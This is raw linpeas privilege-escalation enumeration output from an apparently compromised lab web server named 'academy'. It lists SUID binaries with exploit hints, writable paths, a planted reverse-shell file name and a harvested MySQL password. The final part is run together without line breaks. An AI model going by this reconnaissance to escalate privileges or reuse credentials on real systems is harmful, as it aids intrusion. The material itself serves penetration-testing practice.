[+] SUID                                                                                                                                                       
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           
/usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                    
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/chfn           --->    SuSE_9.3/10
/usr/bin/mount          --->    Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/usr/bin/newgrp         --->    HP-UX_10.20
/usr/bin/umount         --->    BSD/Linux[1996-08-13]
/usr/bin/chsh
/usr/bin/passwd         --->    Apple_Mac_OSX/Solaris/SPARC_8/9/Sun_Solaris_2.5.1_PAM
/usr/bin/su
/usr/bin/gpasswd

[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           
/usr/sbin/unix_chkpwd                                                                                                                                          
/usr/bin/bsd-write
/usr/bin/expiry
/usr/bin/wall
/usr/bin/crontab
/usr/bin/dotlockfile
/usr/bin/chage
/usr/bin/ssh-agent

[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                                                                   
/usr/bin/ping = cap_net_raw+ep                                                                                                                                 

[+] .sh files in path
/usr/bin/gettext.sh                                                                                                                                            

[+] Files (scripts) in /etc/profile.d/
total 20                                                                                                                                                       
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  664 Mar  1  2019 bash_completion.sh
-rw-r--r--  1 root root 1107 Sep 14  2018 gawk.csh
-rw-r--r--  1 root root  757 Sep 14  2018 gawk.sh

[+] Hashes inside passwd file? ........... No
[+] Can I read shadow files? ........... No                                                                                                                    
[+] Can I read root folder? ........... No                                                                                                                     
                                                                                                                                                               
[+] Looking for root files in home dirs (limit 20)
/home                                                                                                                                                          

[+] Looking for root files in folders owned by me
                                                                                                                                                               
[+] Readable files belonging to root and readable by me but not world readable
                                                                                                                                                               
[+] Files inside /home/www-data (limit 20)
                                                                                                                                                               
[+] Files inside others home (limit 20)
/home/grimmie/.bash_history                                                                                                                                    
/home/grimmie/.bashrc
/home/grimmie/backup.sh
/home/grimmie/.profile
/home/grimmie/.bash_logout

[+] Looking for installed mail applications
                                                                                                                                                               
[+] Mails (limit 50)
                                                                                                                                                               
[+] Backup files?
-rwxr-xr-- 1 grimmie administrator 112 May 30  2021 /home/grimmie/backup.sh                                                                                    
-rwxr-xr-x 1 root root 38412 Nov 25  2020 /usr/bin/wsrep_sst_mariabackup

[+] Looking for tables inside readable .db/.sqlite files (limit 100)
                                                                                                                                                               
[+] Web files?(output limit)
/var/www/:                                                                                                                                                     
total 12K
drwxr-xr-x  3 root root 4.0K May 29  2021 .
drwxr-xr-x 12 root root 4.0K May 29  2021 ..
drwxr-xr-x  3 root root 4.0K May 29  2021 html

/var/www/html:
total 24K
drwxr-xr-x 3 root     root     4.0K May 29  2021 .
drwxr-xr-x 3 root     root     4.0K May 29  2021 ..

[+] *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .gitconfig, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml                                                                                                                                                   
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data                                                                            
-rw-r--r-- 1 root root 1994 Apr 18  2019 /etc/bash.bashrc                                                                                                      
-rw-r--r-- 1 root root 3526 Apr 18  2019 /etc/skel/.bashrc
-rw-r--r-- 1 root root 807 Apr 18  2019 /etc/skel/.profile
-rw-r--r-- 1 grimmie administrator 3526 May 29  2021 /home/grimmie/.bashrc
-rw-r--r-- 1 grimmie administrator 807 May 29  2021 /home/grimmie/.profile
-rw-r--r-- 1 root root 2778 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc
-rw-r--r-- 1 root root 802 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc
-rw-r--r-- 1 root root 570 Jan 31  2010 /usr/share/base-files/dot.bashrc

[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
   139266      4 -rw-r--r--   1 grimmie  administrator      220 May 29  2021 /home/grimmie/.bash_logout                                                        
   270249      4 -rw-r--r--   1 root     root               240 Oct 15  2020 /usr/share/phpmyadmin/vendor/paragonie/constant_time_encoding/.travis.yml
   270133      4 -rw-r--r--   1 root     root               250 Oct 15  2020 /usr/share/phpmyadmin/vendor/bacon/bacon-qr-code/.travis.yml
   389530      4 -rw-r--r--   1 root     root               946 Oct 15  2020 /usr/share/phpmyadmin/vendor/pragmarx/google2fa/.scrutinizer.yml
   389531      4 -rw-r--r--   1 root     root               706 Oct 15  2020 /usr/share/phpmyadmin/vendor/pragmarx/google2fa/.travis.yml
   140294      4 -rw-r--r--   1 root     root               608 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/extensions/.travis.yml
   140341      4 -rw-r--r--   1 root     root              1004 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.travis.yml
   140340      4 -rw-r--r--   1 root     root               799 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.php_cs.dist
   140339      4 -rw-r--r--   1 root     root               224 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.editorconfig
   270226      4 -rw-r--r--   1 root     root               633 Oct 15  2020 /usr/share/phpmyadmin/vendor/google/recaptcha/.travis.yml
   138381      0 -rw-r--r--   1 root     root                 0 Nov 15  2018 /usr/share/dictionaries-common/site-elisp/.nosearch
    12136      0 -rw-r--r--   1 root     root                 0 Jul 29  2023 /run/network/.ifstate.lock
   260079      0 -rw-------   1 root     root                 0 May 29  2021 /etc/.pwd.lock
   259843      4 -rw-r--r--   1 root     root               220 Apr 18  2019 /etc/skel/.bash_logout

[+] Readable files inside /tmp, /var/tmp, /var/backups(limit 100)
-rwxrwxrwx 1 www-data www-data 134167 Jul 29 06:32 /tmp/linpeas.sh                                                                                             
-rw-r--r-- 1 root root 11996 May 29  2021 /var/backups/apt.extended_states.0

[+] Interesting writable Files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                                 
/dev/mqueue                                                                                                                                                    
/dev/mqueue/linpeas.txt
/dev/shm
/run/lock
/run/lock/apache2
/sys/kernel/security/apparmor/.access
/sys/kernel/security/apparmor/.load
/sys/kernel/security/apparmor/.remove
/sys/kernel/security/apparmor/.replace
/tmp
/tmp/linpeas.sh
/var/cache/apache2/mod_cache_disk
/var/lib/php/sessions
/var/lib/phpmyadmin
/var/lib/phpmyadmin/tmp
/var/lib/phpmyadmin/tmp/twig
/var/lib/phpmyadmin/tmp/twig/15
/var/lib/phpmyadmin/tmp/twig/15/15a885ca9738e5a84084a3e52f1f6b23c771ea4f7bdca01081f7b87d3b86a6f9.php
/var/lib/phpmyadmin/tmp/twig/21
/var/lib/phpmyadmin/tmp/twig/21/21a3bee2bc40466295b888b9fec6fb9d77882a7cf061fd3f3d7194b5d54ab837.php
/var/lib/phpmyadmin/tmp/twig/22
/var/lib/phpmyadmin/tmp/twig/22/22f328e86274b51eb9034592ac106d133734cc8f4fba3637fe76b0a4b958f16d.php
/var/lib/phpmyadmin/tmp/twig/28
/var/lib/phpmyadmin/tmp/twig/28/28bcfd31671cb4e1cff7084a80ef5574315cd27a4f33c530bc9ae8da8934caf6.php
/var/lib/phpmyadmin/tmp/twig/2e
/var/lib/phpmyadmin/tmp/twig/2e/2e6ed961bffa8943f6419f806fe7bfc2232df52e39c5880878e7f34aae869dd9.php
/var/lib/phpmyadmin/tmp/twig/31
/var/lib/phpmyadmin/tmp/twig/31/317c8816ee34910f2c19f0c2bd6f261441aea2562acc0463975f80a4f0ed98a9.php
/var/lib/phpmyadmin/tmp/twig/36
/var/lib/phpmyadmin/tmp/twig/36/360a7a01227c90acf0a097d75488841f91dc2939cebca8ee28845b8abccb62ee.php
/var/lib/phpmyadmin/tmp/twig/3b
/var/lib/phpmyadmin/tmp/twig/3b/3bf8a6b93e8c4961d320a65db6c6f551428da6ae8b8e0c87200629b4ddad332d.php
/var/lib/phpmyadmin/tmp/twig/41
/var/lib/phpmyadmin/tmp/twig/41/4161342482a4d1436d31f5619bbdbd176c50e500207e3f364662f5ba8210fe31.php
/var/lib/phpmyadmin/tmp/twig/42
/var/lib/phpmyadmin/tmp/twig/42/426cadcf834dab31a9c871f8a7c8eafa83f4c66a2297cfefa7aae7a7895fa955.php
/var/lib/phpmyadmin/tmp/twig/43
/var/lib/phpmyadmin/tmp/twig/43/43cb8c5a42f17f780372a6d8b976cafccd1f95b8656d9d9638fca2bb2c0c1ee6.php
/var/lib/phpmyadmin/tmp/twig/4c
/var/lib/phpmyadmin/tmp/twig/4c/4c13e8023eae0535704510f289140d5447e25e2dea14eaef5988afa2ae915cb9.php
/var/lib/phpmyadmin/tmp/twig/4e
/var/lib/phpmyadmin/tmp/twig/4e/4e68050e4aec7ca6cfa1665dd465a55a5d643fca6abb104a310e5145d7310851.php
/var/lib/phpmyadmin/tmp/twig/4e/4e8f70ab052f0a5513536d20f156e0649e1791c083804a629624d2cb1e052f1f.php
/var/lib/phpmyadmin/tmp/twig/4f
/var/lib/phpmyadmin/tmp/twig/4f/4f7c1ace051b6b8cb85528aa8aef0052b72277f654cb4f13f2fc063f8529efe4.php
/var/lib/phpmyadmin/tmp/twig/53
/var/lib/phpmyadmin/tmp/twig/53/53ec6cf1deb6f8f805eb3077b06e6ef3b7805e25082d74c09563f91a11c1dfcd.php
/var/lib/phpmyadmin/tmp/twig/5c
/var/lib/phpmyadmin/tmp/twig/5c/5cf13d5a4ba7434d92bc44defee51a93cfbafa0d7984fcb8cbea606d97fe3e1a.php
/var/lib/phpmyadmin/tmp/twig/61
/var/lib/phpmyadmin/tmp/twig/61/61cf92e037fb131bad1ea24485b8e2ab7f0dd05dbe0bcdec85d8a96c80458223.php
/var/lib/phpmyadmin/tmp/twig/6b
/var/lib/phpmyadmin/tmp/twig/6b/6b8deef855b316d17c87795aebdf5aa33b55fae3e6c453d2a5bab7c4085f85d7.php
/var/lib/phpmyadmin/tmp/twig/6c
/var/lib/phpmyadmin/tmp/twig/6c/6c9a7cd11578d393beebc51daa9a48d35c8b03d3a69fd786c55ceedf71a62d29.php
/var/lib/phpmyadmin/tmp/twig/73
/var/lib/phpmyadmin/tmp/twig/73/73a22388ea06dda0a2e91e156573fc4c47961ae6e35817742bb6901eb91d5478.php
/var/lib/phpmyadmin/tmp/twig/73/73ee99e209023ff62597f3f6e5f027a498c1261e4d35d310b0d0a2664f3c2c0d.php
/var/lib/phpmyadmin/tmp/twig/78
/var/lib/phpmyadmin/tmp/twig/78/786fc5d49e751f699117fbb46b2e5920f5cdae9b5b3e7bb04e39d201b9048164.php
/var/lib/phpmyadmin/tmp/twig/7d
/var/lib/phpmyadmin/tmp/twig/7d/7d8087d41c482579730682151ac3393f13b0506f63d25d3b07db85fcba5cdbeb.php
/var/lib/phpmyadmin/tmp/twig/7f
/var/lib/phpmyadmin/tmp/twig/7f/7f2fea86c14cdbd8cd63e93670d9fef0c3d91595972a398d9aa8d5d919c9aa63.php
/var/lib/phpmyadmin/tmp/twig/8a
/var/lib/phpmyadmin/tmp/twig/8a/8a16ca4dbbd4143d994e5b20d8e1e088f482b5a41bf77d34526b36523fc966d7.php
/var/lib/phpmyadmin/tmp/twig/8b
/var/lib/phpmyadmin/tmp/twig/8b/8b3d6e41c7dc114088cc4febcf99864574a28c46ce39fd02d9577bec9ce900de.php
/var/lib/phpmyadmin/tmp/twig/96
/var/lib/phpmyadmin/tmp/twig/96/96885525f00ce10c76c38335c2cf2e232a709122ae75937b4f2eafcdde7be991.php
/var/lib/phpmyadmin/tmp/twig/97
/var/lib/phpmyadmin/tmp/twig/97/9734627c3841f4edcd6c2b6f193947fc0a7a9a69dd1955f703f4f691af6b45e3.php
/var/lib/phpmyadmin/tmp/twig/99
/var/lib/phpmyadmin/tmp/twig/99/9937763182924ca59c5731a9e6a0d96c77ec0ca5ce3241eec146f7bca0a6a0dc.php
/var/lib/phpmyadmin/tmp/twig/9d
/var/lib/phpmyadmin/tmp/twig/9d/9d254bc0e43f46a8844b012d501626d3acdd42c4a2d2da29c2a5f973f04a04e8.php
/var/lib/phpmyadmin/tmp/twig/9d/9d6c5c59ee895a239eeb5956af299ac0e5eb1a69f8db50be742ff0c61b618944.php
/var/lib/phpmyadmin/tmp/twig/9e
/var/lib/phpmyadmin/tmp/twig/9e/9ed23d78fa40b109fca7524500b40ca83ceec9a3ab64d7c38d780c2acf911588.php
/var/lib/phpmyadmin/tmp/twig/a0
/var/lib/phpmyadmin/tmp/twig/a0/a0c00a54b1bb321f799a5f4507a676b317067ae03b1d45bd13363a544ec066b7.php
/var/lib/phpmyadmin/tmp/twig/a4
/var/lib/phpmyadmin/tmp/twig/a4/a49a944225d69636e60c581e17aaceefffebe40aeb5931afd4aaa3da6a0039b9.php
/var/lib/phpmyadmin/tmp/twig/a7
/var/lib/phpmyadmin/tmp/twig/a7/a7e9ef3e1f57ef5a497ace07803123d1b50decbe0fcb448cc66573db89b48e25.php
/var/lib/phpmyadmin/tmp/twig/ae
/var/lib/phpmyadmin/tmp/twig/ae/ae25b735c0398c0c6a34895cf07f858207e235cf453cadf07a003940bfb9cd05.php
/var/lib/phpmyadmin/tmp/twig/af
/var/lib/phpmyadmin/tmp/twig/af/af668e5234a26d3e85e170b10e3d989c2c0c0679b2e5110d593a80b4f58c6443.php
/var/lib/phpmyadmin/tmp/twig/af/af6dd1f6871b54f086eb95e1abc703a0e92824251df6a715be3d3628d2bd3143.php
/var/lib/phpmyadmin/tmp/twig/af/afa81ff97d2424c5a13db6e43971cb716645566bd8d5c987da242dddf3f79817.php
/var/lib/phpmyadmin/tmp/twig/b6
/var/lib/phpmyadmin/tmp/twig/b6/b6c8adb0e14792534ce716cd3bf1d57bc78d45138e62be7d661d75a5f03edcba.php
/var/lib/phpmyadmin/tmp/twig/c3
/var/lib/phpmyadmin/tmp/twig/c3/c34484a1ece80a38a03398208a02a6c9c564d1fe62351a7d7832d163038d96f4.php
/var/lib/phpmyadmin/tmp/twig/c5
/var/lib/phpmyadmin/tmp/twig/c5/c50d1c67b497a887bc492962a09da599ee6c7283a90f7ea08084a548528db689.php
/var/lib/phpmyadmin/tmp/twig/c7
/var/lib/phpmyadmin/tmp/twig/c7/c70df99bff2eea2f20aba19bbb7b8d5de327cecaedb5dc3d383203f7d3d02ad2.php
/var/lib/phpmyadmin/tmp/twig/ca
/var/lib/phpmyadmin/tmp/twig/ca/ca32544b55a5ebda555ff3c0c89508d6e8e139ef05d8387a14389443c8e0fb49.php
/var/lib/phpmyadmin/tmp/twig/d6
/var/lib/phpmyadmin/tmp/twig/d6/d66c84e71db338af3aae5892c3b61f8d85d8bb63e2040876d5bbb84af484fb41.php
/var/lib/phpmyadmin/tmp/twig/dd
/var/lib/phpmyadmin/tmp/twig/dd/dd1476242f68168118c7ae6fc7223306d6024d66a38b3461e11a72d128eee8c1.php
/var/lib/phpmyadmin/tmp/twig/e8
/var/lib/phpmyadmin/tmp/twig/e8/e8184cd61a18c248ecc7e06a3f33b057e814c3c99a4dd56b7a7da715e1bc2af8.php
/var/lib/phpmyadmin/tmp/twig/e9
/var/lib/phpmyadmin/tmp/twig/e9/e93db45b0ff61ef08308b9a87b60a613c0a93fab9ee661c8271381a01e2fa57a.php
/var/lib/phpmyadmin/tmp/twig/f5
/var/lib/phpmyadmin/tmp/twig/f5/f589c1ad0b7292d669068908a26101f0ae7b5db110ba174ebc5492c80bc08508.php
/var/lib/phpmyadmin/tmp/twig/fa
/var/lib/phpmyadmin/tmp/twig/fa/fa249f377795e48c7d92167e29cef2fc31f50401a0bdbc95ddb51c0aec698b9e.php
/var/tmp
/var/www/html/academy
/var/www/html/academy/admin
/var/www/html/academy/admin/assets
/var/www/html/academy/admin/assets/css
/var/www/html/academy/admin/assets/css/bootstrap.css
/var/www/html/academy/admin/assets/css/font-awesome.css
/var/www/html/academy/admin/assets/css/style.css
/var/www/html/academy/admin/assets/fonts
/var/www/html/academy/admin/assets/fonts/FontAwesome.otf
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.eot
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.svg
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.ttf
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff2
/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.eot
/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.svg
/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.ttf
/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.woff
/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.woff2
/var/www/html/academy/admin/assets/img
/var/www/html/academy/admin/assets/js
/var/www/html/academy/admin/assets/js/bootstrap.js
/var/www/html/academy/admin/assets/js/jquery-1.11.1.js
/var/www/html/academy/admin/change-password.php
/var/www/html/academy/admin/check_availability.php
/var/www/html/academy/admin/course.php
/var/www/html/academy/admin/department.php
/var/www/html/academy/admin/edit-course.php
/var/www/html/academy/admin/enroll-history.php
/var/www/html/academy/admin/includes
/var/www/html/academy/admin/includes/config.php
/var/www/html/academy/admin/includes/footer.php
/var/www/html/academy/admin/includes/header.php
/var/www/html/academy/admin/includes/menubar.php
/var/www/html/academy/admin/index.php
/var/www/html/academy/admin/level.php
/var/www/html/academy/admin/logout.php
/var/www/html/academy/admin/manage-students.php
/var/www/html/academy/admin/print.php
/var/www/html/academy/admin/semester.php
/var/www/html/academy/admin/session.php
/var/www/html/academy/admin/student-registration.php
/var/www/html/academy/admin/user-log.php
/var/www/html/academy/assets
/var/www/html/academy/assets/css
/var/www/html/academy/assets/css/bootstrap.css
/var/www/html/academy/assets/css/font-awesome.css
/var/www/html/academy/assets/css/style.css
/var/www/html/academy/assets/fonts
/var/www/html/academy/assets/fonts/FontAwesome.otf
/var/www/html/academy/assets/fonts/fontawesome-webfont.eot
/var/www/html/academy/assets/fonts/fontawesome-webfont.svg
/var/www/html/academy/assets/fonts/fontawesome-webfont.ttf
/var/www/html/academy/assets/fonts/fontawesome-webfont.woff
/var/www/html/academy/assets/fonts/fontawesome-webfont.woff2
/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.eot
/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.svg
/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.ttf
/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.woff
/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.woff2
/var/www/html/academy/assets/img
/var/www/html/academy/assets/js
/var/www/html/academy/assets/js/bootstrap.js
/var/www/html/academy/assets/js/jquery-1.11.1.js
/var/www/html/academy/change-password.php
/var/www/html/academy/check_availability.php
/var/www/html/academy/db
/var/www/html/academy/db/onlinecourse.sql
/var/www/html/academy/enroll-history.php
/var/www/html/academy/enroll.php
/var/www/html/academy/includes
/var/www/html/academy/includes/config.php
/var/www/html/academy/includes/footer.php
/var/www/html/academy/includes/header.php
/var/www/html/academy/includes/menubar.php
/var/www/html/academy/index.php
/var/www/html/academy/logout.php
/var/www/html/academy/my-profile.php
/var/www/html/academy/pincode-verification.php
/var/www/html/academy/print.php
/var/www/html/academy/studentphoto
/var/www/html/academy/studentphoto/php-rev.php
/tmp/linpeas.sh
/dev/mqueue/linpeas.txt

[+] Searching passwords in config PHP files
$mysql_password = "My_V3ryS3cur3_P4ss";                                                                                                                        
$mysql_password = "My_V3ryS3cur3_P4ss";

[+] Finding IPs inside logs (limit 100)
     44 /var/log/dpkg.log.1:1.8.2.1                                                                                                                            
     24 /var/log/dpkg.log.1:1.8.2.3
     14 /var/log/dpkg.log.1:1.8.4.3
      9 /var/log/wtmp:192.168.10.31
      7 /var/log/dpkg.log.1:7.43.0.2
      7 /var/log/dpkg.log.1:4.8.6.1
      7 /var/log/dpkg.log.1:1.7.3.2
      7 /var/log/dpkg.log.1:0.5.10.2
      7 /var/log/dpkg.log.1:0.19.8.1
      4 /var/log/installer/status:1.2.3.3
      1 /var/log/lastlog:192.168.10.31

[+] Finding passwords inside logs (limit 100)
/var/log/dpkg.log.1:2021-05-29 17:00:10 install base-passwd:amd64 <none> 3.5.46                                                                                
/var/log/dpkg.log.1:2021-05-29 17:00:10 status half-installed base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:11 configure base-passwd:amd64 3.5.46 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:11 status half-configured base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:11 status installed base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:11 status unpacked base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:18 status half-configured base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:18 status half-installed base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:18 status unpacked base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:18 upgrade base-passwd:amd64 3.5.46 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:21 install passwd:amd64 <none> 1:4.5-1.1
/var/log/dpkg.log.1:2021-05-29 17:00:21 status half-installed passwd:amd64 1:4.5-1.1
/var/log/dpkg.log.1:2021-05-29 17:00:21 status unpacked passwd:amd64 1:4.5-1.1
/var/log/dpkg.log.1:2021-05-29 17:00:24 configure base-passwd:amd64 3.5.46 <none>
/var/log/dpkg.log.1:2021-05-29 17:00:24 status half-configured base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:24 status installed base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:24 status unpacked base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:25 configure passwd:amd64 1:4.5-1.1 <none>
/var/log/dpkg.log.1:2021-05-29 17:00:25 status half-configured passwd:amd64 1:4.5-1.1
/var/log/dpkg.log.1:2021-05-29 17:00:25 status installed passwd:amd64 1:4.5-1.1
/var/log/dpkg.log.1:2021-05-29 17:00:25 status unpacked passwd:amd64 1:4.5-1.1
/var/log/installer/status:Description: Set up users and passwords

[+] Finding emails inside logs (limit 100)
      1 /var/log/installer/status:aeb@debian.org                                                                                                               
      1 /var/log/installer/status:anibal@debian.org
      2 /var/log/installer/status:berni@debian.org
     40 /var/log/installer/status:debian-boot@lists.debian.org
     16 /var/log/installer/status:debian-kernel@lists.debian.org
      1 /var/log/installer/status:debian-med-packaging@lists.alioth.debian.org
      1 /var/log/installer/status:debian@jff.email
      1 /var/log/installer/status:djpig@debian.org
      4 /var/log/installer/status:gcs@debian.org
      2 /var/log/installer/status:guillem@debian.org
      1 /var/log/installer/status:guus@debian.org
      1 /var/log/installer/status:linux-xfs@vger.kernel.org
      2 /var/log/installer/status:mmind@debian.org
      1 /var/log/installer/status:open-iscsi@packages.debian.org
      1 /var/log/installer/status:open-isns@packages.debian.org
      1 /var/log/installer/status:packages@release.debian.org
      2 /var/log/installer/status:parted-maintainers@alioth-lists.debian.net
      1 /var/log/installer/status:petere@debian.org
      2 /var/log/installer/status:pkg-gnupg-maint@lists.alioth.debian.org
      1 /var/log/installer/status:pkg-gnutls-maint@lists.alioth.debian.org
      1 /var/log/installer/status:pkg-grub-devel@alioth-lists.debian.net
      1 /var/log/installer/status:pkg-mdadm-devel@lists.alioth.debian.org
      1 /var/log/installer/status:rogershimizu@gmail.com
      2 /var/log/installer/status:team+lvm@tracker.debian.org
      1 /var/log/installer/status:tytso@mit.edu
      1 /var/log/installer/status:wpa@packages.debian.org
      1 /var/log/installer/status:xnox@debian.org

[+] Finding *password* or *credential* files in home
                                                                                                                                                               
[+] Finding 'pwd' or 'passw' string inside /home, /var/www, /etc, /root and list possible web(/var/www) and config(/etc) passwords
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff2                                                                                             
/var/www/html/academy/admin/assets/js/jquery-1.11.1.js
/var/www/html/academy/admin/change-password.php
/var/www/html/academy/admin/includes/config.php
/var/www/html/academy/admin/index.php
/var/www/html/academy/admin/manage-students.php
/var/www/html/academy/admin/student-registration.php
/var/www/html/academy/assets/fonts/fontawesome-webfont.woff2
/var/www/html/academy/assets/js/jquery-1.11.1.js
/var/www/html/academy/change-password.php
/var/www/html/academy/db/onlinecourse.sql
/var/www/html/academy/includes/config.php
/var/www/html/academy/includes/menubar.php
/var/www/html/academy/index.php
/var/www/html/academy/pincode-verification.php
/var/www/html/academy/admin/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";
/var/www/html/academy/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";
/etc/apache2/sites-available/default-ssl.conf:          #        Note that no password is obtained from the user. Every entry in the user
/etc/apache2/sites-available/default-ssl.conf:          #        file needs this password: `xxj31ZMTZzkVA'.
/etc/apparmor.d/abstractions/authentication:  # databases containing passwords, PAM configuration files, PAM libraries
/etc/debconf.conf:Accept-Type: password
/etc/debconf.conf:Filename: /var/cache/debconf/passwords.dat
/etc/debconf.conf:Name: passwords
/etc/debconf.conf:Reject-Type: password
/etc/debconf.conf:Stack: config, passwordsLinux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist LEYEND:                                                                                                                                                         RED/YELLOW: 99% a PE vector  RED: You must take a look at it  LightCyan: Users with console  Blue: Users without console & mounted devs  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)   LightMangenta: Your username====================================( Basic information )=====================================OS: Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)                  User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)Hostname: academyWritable folder: /dev/shm[+] /usr/bin/ping is available for network discovery (You can use linpeas to discover hosts, learn more with -h)[+] /usr/bin/nc is available for network discover & port scanning (You can use linpeas to discover hosts/port scanning, learn more with -h)                                                                                                                                                                                   ====================================( System Information )====================================[+] Operative system                                                                                                                                           [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                                                                Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)                      Distributor ID: DebianDescription:    Debian GNU/Linux 10 (buster)Release:        10Codename:       buster[+] Sudo versionsudo Not Found                                                                                                                                                                                                                                                                                                                [+] PATH[i] Any writable folder in original PATH? (a new completed path will be exported)                                                                              /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                   New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin[+] DateSat Jul 29 06:37:17 EDT 2023                                                                                                                                   [+] System statsFilesystem      Size  Used Avail Use% Mounted on                                                                                                               /dev/sda1       6.9G  1.9G  4.7G  29% /udev            479M     0  479M   0% /devtmpfs           494M     0  494M   0% /dev/shmtmpfs            99M  4.3M   95M   5% /runtmpfs           5.0M     0  5.0M   0% /run/locktmpfs           494M     0  494M   0% /sys/fs/cgrouptmpfs            99M     0   99M   0% /run/user/0              total        used        free      shared  buff/cache   availableMem:        1009960      178916      474532       10816      356512      640884Swap:        998396           0      998396[+] Environment[i] Any private information inside environment variables?                                                                                                      HISTFILESIZE=0                                                                                                                                                 APACHE_RUN_DIR=/var/run/apache2APACHE_PID_FILE=/var/run/apache2/apache2.pidJOURNAL_STREAM=9:13967PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binINVOCATION_ID=d29a7dcbdfb3443ebe10d76ee30417d9APACHE_LOCK_DIR=/var/lock/apache2LANG=CHISTSIZE=0APACHE_RUN_USER=www-dataAPACHE_RUN_GROUP=www-dataAPACHE_LOG_DIR=/var/log/apache2HISTFILE=/dev/null[+] Looking for Signature verification failed in dmseg Not Found                                                                                                                                                                                                                                                                                                                    [+] selinux enabled? .......... sestatus Not Found[+] Printer? .......... lpstat Not Found                                                                                                                       [+] Is this a container? .......... No                                                                                                                         [+] Is ASLR enabled? .......... Yes                                                                                                                            =========================================( Devices )==========================================[+] Any sd* disk in /dev? (limit 20)                                                                                                                           sda                                                                                                                                                            sda1sda2sda5[+] Unmounted file-system?[i] Check if you can mount umounted devices                                                                                                                    UUID=24d0cea7-c37b-4fd6-838e-d05cfb61a601 /               ext4    errors=remount-ro 0       1                                                                  UUID=930c51cc-089d-42bd-8e30-f08b86c52dca none            swap    sw              0       0/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0====================================( Available Software )====================================[+] Useful software?                                                                                                                                           /usr/bin/nc                                                                                                                                                    /usr/bin/netcat/usr/bin/nc.traditional/usr/bin/wget/usr/bin/ping/usr/bin/base64/usr/bin/socat/usr/bin/python/usr/bin/python2/usr/bin/python3/usr/bin/python2.7/usr/bin/python3.7/usr/bin/perl/usr/bin/php[+] Installed compilers?Compilers Not Found                                                                                                                                                                                                                                                                                                           ================================( Processes, Cron & Services )================================[+] Cleaned processes                                                                                                                                          [i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                       USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND                                                                                       root         1  0.0  0.9 103796  9972 ?        Ss   05:18   0:01 /sbin/initroot       324  0.0  0.7  40376  7976 ?        Ss   05:18   0:00 /lib/systemd/systemd-journaldroot       349  0.0  0.4  21932  4952 ?        Ss   05:18   0:00 